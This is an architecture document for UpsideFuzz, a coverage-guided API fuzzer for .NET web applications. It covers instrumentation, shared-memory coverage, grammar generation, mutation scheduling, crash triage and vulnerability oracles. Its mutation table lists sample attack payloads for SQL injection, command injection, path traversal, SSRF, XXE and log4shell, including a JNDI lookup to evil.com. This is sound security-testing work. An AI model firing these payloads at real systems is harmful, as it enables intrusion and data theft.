# UpsideFuzz Platform Architecture

This document describes the internal design, components, and data flows of the **UpsideFuzz** platform — from source analysis through instrumentation, runtime synchronization, coverage feedback, and coverage-guided fuzzing.

**→ [Back to README](README.md) · [Full Runbook](INSTRUCTIONS.md) · [Docs Index](docs/INDEX.md)**

---

## High-Level Overview

The platform automates transforming a standard .NET solution into a feedback-driven fuzzing target in six stages:

1. **Analysis** — Discovering business logic across all projects in a solution
2. **Preparation** — Adapting Docker configs, injecting coverage infrastructure
3. **Instrumentation** — Injecting SharpFuzz coverage probes into target DLLs during Docker build
4. **Synchronization** — Linking all instrumented DLLs to a single shared memory bitmap at runtime
5. **Grammar Generation** — Compiling an OpenAPI spec into typed request templates via RESTler + source enrichment
6. **Fuzzing** — Sending mutated inputs with epoch-based scheduling, adaptive concurrency, and crash triage

---

## End-to-End Flow Diagram

```
┌────────────────────────────────────────────────────────────────────┐
│                        .NET Solution Source                        │
│              (*.sln / *.csproj / Dockerfile / compose)             │
└──────────────────────────────┬─────────────────────────────────────┘
                               │
                    ┌──────────▼──────────┐
                    │  fuzz-prep-multi.py  │
                    │                      │
                    │  • Scan *.csproj     │
                    │  • Skip test projects│
                    │  • Detect biz logic  │
                    │  • Collect namespaces│
                    └──────────┬──────────┘
                               │  Writes to OUTPUT_DIR (copy of src)
         ┌─────────────────────┼──────────────────────────┐
         │                     │                          │
         ▼                     ▼                          ▼
  Dockerfile            compose.yaml           New/Modified Files
  (4 stages)           (+SHM volumes)         instrumentor_src/
  injected             +Development env       Helpers/CoverageExtensions.cs
                       +sidecar template      Program.cs (patched)
                                              *.csproj (patched)
                               │
                    ┌──────────▼──────────┐
                    │  docker compose      │
                    │       build          │
                    └──────────┬──────────┘
                               │
              ┌────────────────┼────────────────┐
              │                │                │
     Stage 1: builder   Stage 2+3: instrument  Stage 4: runtime
     dotnet publish     SharpFuzz IL rewriting  minimal aspnet image
                        (namespace-filtered)    COPY from instrumentation
              │                │                │
              └────────────────┴────────────────┘
                               │
                    ┌──────────▼──────────┐
                    │  docker compose up   │
                    │                      │
                    │  [App Container]     │
                    │  ┌─────────────────┐ │
                    │  │  Web API Process │ │
                    │  │  DLL-A.dll ──┐  │ │
                    │  │  DLL-B.dll ──┼─►│ │  SHM bitmap (256KB default)
                    │  │  DLL-C.dll ──┘  │ │  /coverage_shm/bitmap
                    │  │  [SyncSharpFuzz]─┼─┼─► (tmpfs mmap)
                    │  │  /shm/create    │ │
                    │  │  /shm/coverage  │ │
                    │  │  /shm/reset     │ │
                    │  └─────────────────┘ │
                    └──────────┬──────────┘
                               │
              ┌────────────────┼────────────────┐
              │                                 │
              ▼                                 ▼
   compile-grammar.sh                  GET /swagger/v1/swagger.json
   + enhance-grammar.py
              │
     ┌────────┴────────┐
     │                 │
     ▼                 ▼
 grammar.py         dict.json
 (templates)        (tokens)
     │
     └──────────────────────────────────────────┐
                                                │
                    ┌───────────────────────────▼──────────────────────┐
                    │            Void                         │
                    │                                                   │
                    │  ┌─ Epoch scheduler ─────────────────────────┐   │
                    │  │  Baseline → Deterministic → Havoc →        │   │
                    │  │  Splicing                                  │   │
                    │  └───────────────────────────────────────────┘   │
                    │                                                   │
                    │  ┌─ Worker pool (adaptive concurrency) ───────┐  │
                    │  │  goroutines → HTTP requests → responses    │  │
                    │  │  cookie jar, auth header, anti-forgery     │  │
                    │  └───────────────────────────────────────────┘   │
                    │                                                   │
                    │  ┌─ Coverage reader ──────────────────────────┐  │
                    │  │  Mode A: mmap /coverage_shm/bitmap         │  │
                    │  │  Mode B: GET /shm/coverage (HTTP)          │  │
                    │  └───────────────────────────────────────────┘   │
                    │                                                   │
                    │  ┌─ Mutation engine ──────────────────────────┐  │
                    │  │  MOpt-style weighted categories             │  │
                    │  │  sqli / xss / cmdi / ssti / ssrf /...      │  │
                    │  └───────────────────────────────────────────┘   │
                    │                                                   │
                    │  ┌─ Crash triage ─────────────────────────────┐  │
                    │  │  Repro → Minimize → JSONL → PoC file       │  │
                    │  └───────────────────────────────────────────┘   │
                    └───────────────────────────────────────────────────┘
```

---

## 1. Discovery & Analysis (`fuzz-prep-multi.py`)

### Project Enumeration
- Scans the source directory for all `.csproj` files
- Identifies the **main project** (web SDK or `--main` flag)
- **Skips test projects** by name/path pattern (`*.Tests.csproj`, `/test/`, `/tests/`)

### Business Logic Detection
Uses file-name and directory heuristics to identify code worth fuzzing:

| Pattern | Category |
|---------|----------|
| `*Controller.cs` | API endpoint handlers |
| `*Service.cs` | Business logic services |
| `*Repository.cs` | Data access layer |
| `*Validator.cs` | Input validation rules |
| `*Handler.cs` | CQRS/MediatR handlers |
| `*Command.cs`, `*Query.cs` | CQRS command/query objects |
| `*Aggregate.cs`, `*Specification.cs` | DDD patterns |
| `*Endpoint.cs` | Minimal API / FastEndpoints |
| `*Logic.cs`, `*Manager.cs` | Domain logic |
| Directories: `Controllers/`, `Features/`, `Handlers/` | Structural detection |

### Dynamic Configuration Detection

| Detection | Method | Fallback |
|-----------|--------|----------|
| Builder variable name | Regex on `WebApplication.CreateBuilder(...)` | `builder` |
| App variable name | Regex on `<builder>.Build()` | `app` |
| Dockerfile runtime stage | Last `FROM ... AS <name>` stage | `runtime` |
| Dockerfile publish directory | `--output` / `-o` in `dotnet publish` | `/app/publish` |
| Dockerfile source stage | Stage before runtime with publish output | `publish` |
| SDK version | `global.json` → `sdk.version` | Derived from `TargetFramework` |
| Target framework | `<TargetFramework>` or highest in `<TargetFrameworks>` | `net8.0` |
| Root namespace | `<RootNamespace>` in `.csproj` | Project name |

### Namespace Aggregation
Collects namespaces from identified files to create a **whitelist filter configuration** (`namespaces.json`) for the generic instrumentor. The instrumentor reads this config at runtime to only instrument code in these namespaces — skipping system libraries and generated code.

---

## 2. Docker Build Pipeline

The adapted Dockerfile has 4 stages:

```
┌───────────────────────────┐
│  instrumentor-build        │  Builds the SharpFuzz instrumentor tool
│  FROM sdk AS               │  from instrumentor_src/Program.cs
│  instrumentor-build        │  (separate stage — doesn't slow app build)
└─────────────┬─────────────┘
              │
┌─────────────▼─────────────┐
│  builder → publish         │  Standard project build:
│  FROM sdk AS builder       │  dotnet restore → dotnet publish
└─────────────┬─────────────┘
              │
┌─────────────▼─────────────┐
│  instrumentation           │  FROM publish AS instrumentation
│  Inherits published output │  Copies instrumentor from step 1
│  Runs: instrumentor.dll    │  Instruments all business logic DLLs
│  for each *.dll            │  in-place (IL rewriting)
└─────────────┬─────────────┘
              │
┌─────────────▼─────────────┐
│  final / runtime / app     │  FROM aspnet AS final
│  COPY --from=instrumentation │  Gets pre-instrumented binaries
│  Runs the app normally     │  No SDK needed at runtime
└───────────────────────────┘
```

---

## 3. Instrumentation (IL Rewriting with SharpFuzz)

### How SharpFuzz Works
1. **Assembly Rewriting** — Reads target DLL using Mono.Cecil
2. **Probe Injection** — Inserts `SharpFuzz.Common.Trace.OnBranch` call at every basic block entry
3. **Shared Memory** — Injected code expects `SharpFuzz.Common.Trace.SharedMem` to point to valid memory

### Instrumentation Modes
The instrumentor has two selection modes; both always exclude entry points (`Program`, `Startup`), EF infra (`Migration`, `DesignTimeDbContext`), our own `CoverageExtensions`, and auto-generated types (`.g.`, `c__DisplayClass`, `d__`).

1. **`--instrument-all-user-code` (recommended, now the default for generated Dockerfiles):** rewrite every type whose full name does NOT start with a framework prefix (`System.`, `Microsoft.`, `Newtonsoft.`, …). Because the DLL list already contains only the target's own business assemblies, this instruments all of the app's code and nothing third-party.
2. **`namespaces.json` allowlist:** instrument only types whose full name **contains** a listed namespace (substring match via `fullName.Contains`). Convenient but dangerous — any namespace not listed is silently dropped. This is exactly how Bitwarden's entire `Bit.Commercial.*` Secrets Manager code was omitted from coverage: `Bit.Core` is not a substring of `Bit.Commercial.Core`, and the assembly itself was missing from the DLL list.

**Fail-loud + verify:** the generated instrument loop now aborts the build (`exit 1`) if a present DLL fails to instrument, instead of the old silent `|| true`. After bring-up, `verify_coverage.sh` hits an endpoint with an `X-Fuzz-Request-Id` and asserts `X-Coverage-Edges > 0` — a one-command guard against silently-broken coverage.

---

## 4. Runtime Synchronization (SHM Linking)

When the application starts, multiple DLLs each have their own copy of SharpFuzz. They all need to write to the **same** shared coverage bitmap. The current default size is **256KB** (`262144` bytes), with a minimum supported size of **64KB**.

### SHM Allocation (Dual Mode)

**Mode 1: File-Backed mmap** (when `coverage_shm` tmpfs volume is mounted)
```
/coverage_shm/bitmap  ← tmpfs file, 256KB by default (configurable)
  ↑ written by ASP.NET (all DLLs via reflection linking)
  ↑ read by Go fuzzer sidecar (direct mmap, zero HTTP overhead)
```

```csharp
var fs = new FileStream("/coverage_shm/bitmap", FileMode.OpenOrCreate, ...);
fs.SetLength(262144);
mmf = MemoryMappedFile.CreateFromFile(fs, null, 262144, ...);
accessor = mmf.CreateViewAccessor(0, 262144);
accessor.SafeMemoryMappedViewHandle.AcquirePointer(ref ptr);
globalShmAddr = (IntPtr)ptr;
```

**Mode 2: Heap Allocation** (fallback when no tmpfs volume)
```csharp
globalShmAddr = Marshal.AllocHGlobal(262144);
```
Coverage only accessible via HTTP endpoints (`GET /shm/coverage`).

The `/shm/create` response reports which mode is active: `"mode":"file-backed-mmap"` or `"mode":"heap"`.

### Reflection-Based Linking (`SyncSharpFuzz`)

```
AppDomain.CurrentDomain.GetAssemblies()
  → find all SharpFuzz.Common.Trace types
  → set SharedMem field to globalShmAddr
  → all DLLs now write to the same shared bitmap
```

This works regardless of how many project DLLs were instrumented — they all get linked to the same pointer at startup.

---

## 5. Coverage Reporting Protocol

### `POST /shm/create` — Initialize
- Allocates SHM using the current configured size (256KB by default; minimum 64KB), or opens the existing tmpfs file
- Calls `SyncSharpFuzz()` to link all loaded DLLs
- Returns `{"status": "synced", "mode": "...", "bitmap_size": 262144}` (or the configured size)

### `GET /shm/coverage` — Global Stats
- Reads the shared bitmap via pointer arithmetic
- Counts bytes > 0 (`edges`) and sums all values (`hits`)
- Returns `{"edges": 150, "hits": 5000}`

### `POST /shm/reset` — Reset Bitmap
- Zeroes the shared bitmap
- Used between fuzzing sessions or before per-request measurement

### `GET /shm/coverage/traces` — Legacy
- Maintained for legacy compatibility but largely superseded by header-based injection.

### Per-Request Exact Attribution (`X-Coverage-Delta`)
To achieve zero-overhead tracking in a highly concurrent environment (1,000+ req/s), UpsideFuzz relies on the .NET middleware to calculate coverage inline:
1. Middleware records global edge count *before* the pipeline executes.
2. The pipeline executes the API business logic.
3. Middleware records global edge count *after* execution.
4. The delta is injected directly into the HTTP response header: `X-Coverage-Delta: <number>`.

**The "Coverage Smearing" Trade-off:**
In parallel execution, multiple requests might run simultaneously. If Request A and Request B execute concurrently and 5 new edges are found, *both* responses will report a delta and the fuzzer will assign "Energy" to both payloads. While this breaks perfect thread-isolation, it is a deliberate and highly beneficial trade-off. It avoids the catastrophic performance penalty of copying a 256KB SHM array per-request (which would crash ASP.NET throughput) and instead occasionally over-rewards a seed, which the Fenwick tree and evolutionary decay gracefully filter out over time.

**Exception attribution in production mode (`X-Exception-Type` / `X-Exception-Message`):**
The coverage middleware also reports the .NET exception type and message on 5xx responses. The subtlety: in non-Development mode the app's exception handler starts the response and clears headers *before* the middleware's `finally` block runs, so a header set there is lost — this previously left ~84% of production-mode crashes unattributable. The middleware now detects requests carrying `X-Fuzz-Request-Id` (fuzzer traffic only) and, on an unhandled exception, short-circuits with its own 500 carrying `X-Exception-Type` + `X-Exception-Message` (sanitized: CR/LF and control chars stripped, truncated). Real traffic (no fuzz header) is re-thrown untouched. The Go engine reads both headers; the message feeds `cluster.go`'s root-cause key so clustering stays precise even without a dev-mode stack trace.
---

## 6. Grammar Generation (RESTler + Enhancement)

```
swagger.json
     │
     ▼
RESTler compiler
     │
     ├── grammar.py       Raw typed request templates
     │   (Request objects, Fuzzable fields, produces/consumes deps)
     │
     └── dict.json        Domain-specific string tokens
          │
          ▼
     enhance-grammar.py
          │
          ├── OpenAPI constraints: enum values, format, min/max, pattern
          ├── C# source constraints: [Required], [Range], [StringLength],
          │   [RegularExpression], FluentValidation chains, enum declarations
          └── Multipart form-data: autogenerated seed request templates
```

The grammar provides:
- Request templates with method, path, headers, and body structure
- Typed fuzzable fields (`string`, `int`, `number`, `bool`, `datetime`, `uuid`, `object`)
- **Producer-consumer dependencies** — POST creates an ID that GET/PUT/DELETE uses

---

## 7. Void Architecture

The production fuzzer is the Go runtime (`void/go/`). It implements coverage-guided mutation with structured epochs, a seed corpus, adaptive concurrency, and crash triage.

### Component Map

```
void/go/
├── main.go                CLI flags, config parsing, and bootstrap
├── fuzzer.go              Main lifecycle loop, epochs, and corpus scheduling
├── worker.go              Concurrent HTTP fuzzing loop and coverage attribution
├── coverage.go            SHM bitmap parsing and HTTP coverage reader
├── sequence.go            Stateful producer/consumer chain execution
├── store.go               Knowledge extraction, ID harvesting, and dedup
├── template.go            RESTler grammar parsing and payload rendering
├── mutation_engine.go     MOpt-style mutation scheduler and weights
├── mutations.go           Concrete mutation categories (sqli, xss, etc)
├── crash.go               Crash deduplication, signature generation, JSONL logging
├── cluster.go             Root-cause clustering (many signatures → one bug)
├── oracle.go              BOLA/IDOR + auth-bypass + positive injection oracles
├── triage.go              Source-aware priority and crash route scoring
├── poc.go                 PoC shell scripts and timeline generation
├── report.go              Final JSON crash report and findings summary
├── minimize.go            Crash minimization and repro verification
├── identity.go            Auth identities, multi-identity scheduling, race probing
├── auth.go                JWT/header/cookie auth state and login fallback
├── ui.go                  Live terminal dashboard
├── utils.go               HTTP and string utility functions
├── types.go               Core data structures (Seed, Config, WorkItem)
├── go.mod                 Module: void, go 1.22
└── void                   Pre-built binary (Linux/amd64)
```

### Epoch Architecture

The time budget is divided into four epochs with automatic transitions:

```
Time Budget
|------+--------+------------------------+-------------|
|  5%  |  30%   |          50%           |    15%      |
| Base |  Det   |         Havoc          |  Splicing   |
| line |        |   (depth escalation)   | (cross-seed)|
```

| Epoch | Budget | Description |
|-------|--------|-------------|
| **Baseline** | 5% | Send every template **unmutated**. Populates seed corpus. The maximum coverage reached at the end of this epoch is saved as the `coverage_baseline_ceiling` to act as the denominator for saturation (rather than the raw bitmap capacity). |
| **Deterministic** | 30% | Pick seed by energy, apply **one mutation** per field. Systematic, methodical exploration. |
| **Havoc** | 50% | Pick seed, apply **1-4 stacked mutations**. Depth starts at 1, escalates on coverage stall. |
| **Splicing** | 15% | Pick **two** seeds, use one's template + havoc mutations. Cross-pollinates payloads. |

### Mutation Engine (MOpt-Style Weighted Categories)

Mutations are organized into categories with adaptive weights — categories that discover more coverage edges get higher selection probability:

| Category | Weight | Example Payloads |
|----------|--------|-----------------|
| `boundary` | 1.0 | `""`, `null`, `NaN`, `Infinity` |
| `overflow` | 1.0 | `AAA...` × 100, 1024, 5000, 10000 |
| `sqli` | 1.5 | `' OR '1'='1`, `'; DROP TABLE--`, UNION SELECTs |
| `xss` | 1.5 | `<script>alert(1)`, SVG/img onload, JS proto |
| `cmdi` | 1.5 | `; id`, `` `id` ``, `$(id)` |
| `path_traversal` | 1.5 | `../../../etc/passwd`, encoded variants |
| `ssrf` | 1.5 | AWS/GCP metadata URLs, `file:///`, `dict://` |
| `ssti` | 1.5 | `{{7*7}}`, `${7*7}`, `#{7*7}` |
| `open_redirect` | 1.0 | `//evil.com`, `\\/evil.com` |
| `crlf` | 1.0 | `\r\nX-Injected: pwned` |
| `log4shell` | 1.0 | `${jndi:ldap://evil.com/x}` |
| `nosqli` | 1.0 | `{"$gt":""}`, `{"$where":"sleep(5000)"}` |
| `ldap` | 1.0 | `*)(uid=*))(|(uid=*` |
| `xxe` | 1.0 | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` |
| `unicode` | 1.0 | Zero-width chars, homoglyphs, BOM, RTL |
| `json` | 1.0 | Mass assignment, deep nesting, array overflow, .NET type confusion |

> **Mutation Stacking:** During the `Havoc` and `Splicing` epochs, the engine dynamically chains 2 to 4 mutations together on a single payload. For example, applying `json_dotnet_deser` (injecting `$type` for type confusion) followed by `json_deep_nest` (wrapping the newly injected `$type` in 100 levels of nested dictionaries) allows the fuzzer to organically synthesize highly complex exploits that would be impossible to hardcode in a static dictionary.

### Dynamic Mutation Weights (MOpt Feedback Loop)
The engine does not just randomly pick mutations; it implements an MOpt-style scheduler. Every time a mutation category (e.g., `json` or `sqli`) discovers a **new coverage edge** (verified via the SHM bitmap), its `hitRate` increases. 
- **Weight update formula:** `weight = 1.0 + (hitRate × 4.0)` (scaling up to a maximum 5× multiplier).
This means that if the target application is heavily vulnerable to JSON manipulations but immune to SQLi, the engine will dynamically shift its statistical probability to fire significantly more JSON payloads over time.

### Seed Corpus & Energy Scheduling

A **seed** = saved (template + rendered payload) pair. Corpus = all seeds.

**Lifecycle & Energy Calculation:**
1. **Baseline** → unmutated renderings populate initial corpus
2. **Growth** → mutated requests that find new edges become new seeds
3. **Surprise Factor** → When a heavily-fuzzed endpoint (e.g., hit 10,000 times) suddenly yields a new edge, the assigned energy scales logarithmically: `1.0 + Log2(Requests)`. If it is the first new edge in a long time, the multiplier is multiplied by `3.0`. This heavily favors deep, rare business logic transitions over shallow API surface mapping.
4. **Selection** → Fenwick tree weighted random by **energy**
5. **Boosting** → +5 energy per new edge discovered by a seed's mutations
6. **Decay & Minimization** → 0.5% energy decay per pick (`Energy * 0.995`) prevents starvation and local maximum traps. When the corpus exceeds 500 items, exhausted seeds are pruned to maintain Fenwick tree efficiency.

### Coverage-Guided Loop

```
for each batch (N = concurrency):
    before_edges = read_coverage()    ← mmap or HTTP
    tasks = [send_request(r) for r in batch]
    results = await all tasks         ← parallel HTTP goroutines
    after_edges = read_coverage()
    batch_delta = after_edges - before_edges

    if batch_delta > 0:
        → Save high-delta requests as new seeds
        → Boost energy of contributing seeds
        → Reset stall counter
    else:
        → Increment stall counter
        → After N stalls: increase havoc depth
```

### Coverage Reading Modes

| Mode | How | Overhead |
|------|-----|----------|
| **HTTP** (default) | `GET /shm/coverage` — one HTTP round-trip per `-coverage-interval` requests | Low (~1ms) |
| **Direct SHM** (`-direct-shm`) | `mmap.read(bitmap)` on `/coverage_shm/bitmap` | Near-zero |
| **Per-request header** | `X-Coverage-Delta` response header injected by middleware | Zero overhead per batch |

### Advanced Features

| Feature | Description |
|---------|-------------|
| **Crash triage** | Re-probes 5xx with same payload; calculates Triage Score (detects layer: pre-auth crashes like deserialization are capped at `needs_review`); generates curl PoC |
| **Crash minimization** | Binary search through request payload removing fields until crash fails to repro |
| **Race condition probing** | Sends `-race-burst` parallel identical requests to probe TOCTOU conditions |
| **Multi-identity** | Rotates through multiple auth tokens for authorization bypass testing |
| **Anti-forgery tokens** | Discovers HTML `<input>` token fields, pools and rotates them automatically |
| **Source-aware priority** | Boosts endpoints backed by detected business logic files from `-src` |
| **Adaptive concurrency** | PID-style controller adjusts goroutine count based on error rate |
| **Sequence fanout** | Builds producer→consumer chains using runtime-extracted response IDs |

### Triage Scoring System
UpsideFuzz assigns a heuristic **Triage Score (0.0 to 10.0)** to every discovered crash to filter noise and prioritize critical vulnerabilities.

1. **Base Score (+4.0):** Automatically assigned for any `500 Internal Server Error`.
2. **Dev Stack Leak (+1.5):** Added if the response body contains developer stack traces (e.g., `stack trace`, `exception:`).
3. **Backend Exception (+1.6):** Added if the body reveals critical backend failures (e.g., `sql`, `deadlock`, `nullreferenceexception`).
4. **Sensitive Path (Up to +1.1):** Boosts crashes on high-value endpoints (e.g., `/admin`, `/auth`) via `sensitivePathScore`.
5. **Stateful Trigger (+0.9):** Added if the crash was triggered by a complex Sequence Engine mutation (indicating deep business logic failure).
6. **Penalties:** 
   - `-1.5` for crashes on purely synthetic/non-existent paths (`/api/fuzzstring`).
   - `-2.0` for generic content-type mismatch noise.

**Classification Labels (honest tiers):**
A `likely_vuln*` label **requires a concrete exploitation signal** — a bare 500 never earns it.
- **`likely_vuln_high` / `likely_vuln`**: An exploitation oracle fired (see below) — BOLA/IDOR, broken auth, time-based SQLi, evaluated SSTI, reflected XSS, file read, or SSRF.
- **`confirmed_unhandled_exception`** (score `>= 6.0`, no exploit signal): Reproducible 500 with a backend stack trace — a robustness/DoS bug, *not* a proven vulnerability.
- **`needs_review`** (score `>= 4.0`): A 500 that could not be attributed. Malformed-input parse exceptions (bad GUID/base64) are down-ranked into this tier so they stop masquerading as real code bugs.
- **`target_misconfiguration`**: DI/service-resolution failure (e.g. an unregistered service) — a build/config artifact of the instrumented image, excluded from the vulnerability count.
- **`noise`** (`< 4.0`): Filtered.

### Root-Cause Clustering (`cluster.go`)
The per-crash signature folds in path and mutation, so one bug reached from many routes/payloads yields many signatures — massively over-counting distinct bugs (a real run produced 933 "unique" crashes for ~5 actual bugs). `cluster.go` adds a **ClusterKey** that groups crashes by root cause: the normalized backend exception message plus the first *application* stack frame (framework frames skipped). When no exception detail is available (production mode), it falls back to a coarsened `(method, status, path-template)` key. The report exposes `distinct_root_causes` and a `root_cause_clusters` roll-up — the honest "how many real bugs" number.

### Vulnerability Oracles (`oracle.go`)
Because a 500 is only a robustness signal, UpsideFuzz adds oracles that reuse the multi-identity and mutation machinery to detect *actual* vulnerabilities:
- **BOLA/IDOR + broken auth:** After any successful resource-scoped request under an authenticated identity, the identical request is replayed under every *other* identity and with *no* credentials. A 2xx returning a real body to a different or anonymous principal is a Broken Object-Level Authorization or broken-authentication finding (`access_control: true`, `origin_identity` → `shadow_identity`). Identical bodies score `likely_vuln_high`; differing 2xx bodies score `likely_vuln` and are flagged for manual verification. **Auth-bypass precondition:** the no-credential probe only fires on endpoints the engine has already seen reject unauthenticated access (401/403) — tracked in `authRequiredEndpoints` with a strength (2 = rejected an unauthenticated caller, 1 = rejected someone). A truly public endpoint never accumulates evidence, so it is never flagged, eliminating the public-endpoint false positive. Each oracle has its own flag (`-probe-bola`, `-probe-auth-bypass`, `-probe-mass-assign`) under the `-access-probe` master toggle.
- **Mass assignment:** After a successful write (POST/PUT/PATCH with a JSON object body), the body is re-sent with privileged fields over-posted (`isAdmin`, `role:"SuperAdmin"`, `permissions:["*"]`, `accessLevel:99999`, …). If the server echoes an injected privileged field back with its injected value, it accepted an over-posted field — reported `likely_vuln` (`mass_assignment_privileged_field_accepted`). Values are chosen to be unlikely natural states to keep false positives low.
- **Positive injection:** On non-crash responses where a security-category payload was applied, the engine detects time-based SQLi (latency ≥ threshold and ≥3× baseline on sleep/benchmark payloads), evaluated SSTI (rare arithmetic markers such as `{{1337*1337}}` → `1787569` present but not merely reflected), and reflected XSS. The mutation registry also includes a `dotnet_deser` category of Json.NET `$type` gadget payloads for insecure-deserialization detection.

### Profiles (`-profile`)
To tame the 90-flag surface, `-profile fast|deep|security` applies a curated bundle of defaults — but only to flags the user did **not** explicitly pass (tracked via `flag.Visit`), so any individual flag still wins. `security` prioritizes the oracles and multi-identity coverage; `deep` is a balanced thorough scan; `fast` maximizes throughput for CI.

### Sequence Engine & Fallback Mechanics
The Sequence Engine actively stitches complex API workflows (e.g., `POST /stores` → extracts ID → `PUT /stores/{id}`). 
- **Trigger Rate:** Dictated by the `-sequence-prob` flag (e.g., `0.35` means 35% of all executions are actively stitched sequences).
- **Fallback Validation:** If a producer request fails (e.g., validation error preventing store creation), the downstream consumer lacks a valid ID. Instead of failing or passing literal RESTler placeholders (e.g., `_api_v1_stores_post_id`), the engine dynamically falls back to generating fuzzed variables (e.g., randomly generated UUIDs, `NaN`, `-Infinity`). This ensures that even "failed" sequences result in robust Resource-Based Authorization and input validation testing against downstream endpoints.

---

## 8. SHM Architecture: Why Shared Memory?

HTTP coverage polling (the fallback) adds ~0.5–2ms per batch. At high concurrency (64+ workers), this becomes a meaningful bottleneck. Direct SHM mode eliminates it entirely:

| Method | Throughput (est.) | Overhead | Notes |
|--------|-------------------|----------|-------|
| HTTP JSON (`GET /shm/coverage`) | ~300–600 req/s cap | TCP + routing + serialization | Works everywhere, no volume needed |
| File-backed mmap (`-direct-shm`) | 2000+ req/s | ~microseconds (OS page cache) | Requires `coverage_shm` tmpfs volume (Docker sidecar mode) |

How file-backed mmap works across containers:

```
  [App Container]                    [Fuzzer Container]
  /coverage_shm/bitmap               /coverage_shm/bitmap
        ↑                                   ↓
        └─────── Docker tmpfs volume ────────┘
                  (same physical pages)

  SharpFuzz probes write at every branch
  Go fuzzer reads bitmap every N requests
  → zero HTTP overhead, zero serialization
```

---

## 9. Verified Projects

These targets have current quickstarts, prepared trees, or active benchmark material in this workspace:

| Project | Type | Services | Notes |
|---------|------|---------|-------|
| **Bitwarden** | OSS password manager backend | MSSQL, Identity service, Migrator | Multi-user auth, strict validation, multi-identity fuzzing |
| **BTCPayServer** | OSS payment platform | PostgreSQL, NBXplorer, Bitcoin stack | Greenfield API, API-key auth, larger service graph |
| **eShopOnWeb** | OSS sample store API | SQL Server | Smallest end-to-end target in the repo; `PublicApi` is main project |
| **SimplCommerce** | OSS modular e-commerce | SQL Server, MVC/auth stack | Cookie auth and anti-forgery-heavy target |

---

## 10. Project File Map (Current State)

```
upside-fuzzer/
│
├── fuzz-prep-multi.py          ★ Main tool: analyze, instrument, adapt Dockerfile/compose
├── compile-grammar.sh          ★ Compile swagger.json → RESTler grammar
├── enhance-grammar.py          ★ Post-process grammar/dict (OpenAPI + C# source constraints)
├── sanitize-swagger-for-restler.sh   Fix deepObject/nested arrays
│
├── INSTRUCTIONS.md             ★ Complete runbook (instrument → fuzz → analyze)
├── ARCHITECTURE.md             ★ Platform internals, diagrams, SHM design
├── README.md                   Overview, features, structure
├── QUICKSTART_BITWARDEN.md     Target-specific setup for Bitwarden
├── QUICKSTART_BTCPAYSERVER.md  Target-specific setup for BTCPayServer
├── QUICKSTART_ESHOP.md         Target-specific setup for eShopOnWeb
├── QUICKSTART_SIMPLCOMMERCE.md Target-specific setup for SimplCommerce
├── docs/
│   ├── FUZZER_AUTHENTICATION.md
│   └── auth.identities.example.json
│
├── instrumentor/               Reference instrumentor source + build script
│   ├── Program.cs              Standalone generic config-driven instrumentor
│   ├── instrument.sh           Build + run script
│   └── instrumentor.csproj     Project file
│
├── void/
│   ├── export-templates.py     RESTler grammar.py → JSON templates
│   ├── Dockerfile.go           Container image for the Go fuzzer sidecar
│   ├── README.md               Go fuzzer reference (flags, startup fields, build)
│   ├── go/
│   │   ├── main.go             ★ CLI flags and bootstrap
│   │   ├── fuzzer.go           Main lifecycle hooks and epoch scheduling
│   │   ├── worker.go           Core HTTP fuzzing loop and coverage tracking
│   │   ├── coverage.go         SHM bitmap parsing and HTTP coverage reader
│   │   ├── sequence.go         Stateful producer/consumer chains
│   │   ├── template.go         RESTler grammar parsing and rendering
│   │   ├── store.go            Runtime value harvesting and deduplication
│   │   ├── mutation_engine.go  MOpt-style mutation scheduler
│   │   ├── mutations.go        Payload mutation categories
│   │   ├── auth.go             JWT/header/cookie auth state and login fallback
│   │   ├── identity.go         Multi-identity scheduling and race helpers
│   │   ├── cluster.go          Root-cause clustering (many signatures → one bug)
│   │   ├── oracle.go           BOLA/IDOR + auth-bypass + injection oracles
│   │   ├── triage.go           Source-aware triage and scoring logic
│   │   ├── poc.go              PoC shell scripts and timelines
│   │   ├── report.go           JSON bug report builder
│   │   ├── minimize.go         Crash minimization and repro logic
│   │   ├── ui.go               Terminal UI and plain logging
│   │   ├── utils.go            Common helpers and constants
│   │   ├── types.go            Core data structures
│   │   ├── go.mod
│   │   ├── identity_test.go
│   │   └── poc_test.go
│
├── grammars/
│   ├── bitwarden/              Generated grammar, dict, templates, and security overlay
│   ├── btcpay/                 Generated grammar, dict, and templates
│   ├── eshop/                  Generated grammar, dict, and templates
│   └── simplcommerce/          Generated grammar, dict, and templates
│
├── restler_bin/                RESTler compiler binaries (generated / refreshable)
├── restler_input/              RESTler input (swagger)
├── restler_output/             RESTler compiler output (temporary)
│
├── bitwarden_prep/             Target tree + helper scripts for Bitwarden
├── btcpayserver/               Raw BTCPayServer checkout
├── btcpayserver_prep/          Instrumented BTCPayServer tree
├── eshprep/                    Instrumented eShopOnWeb tree
├── simplcommerce_prep/         Instrumented SimplCommerce tree
├── examples/
│   └── simplcommerce/          SimplCommerce-specific helper scripts and namespace config
├── benchmarks/                 Paper helpers and benchmark post-processing
└── crashes/                    Fuzzer outputs, PoCs, timelines, and reports
```
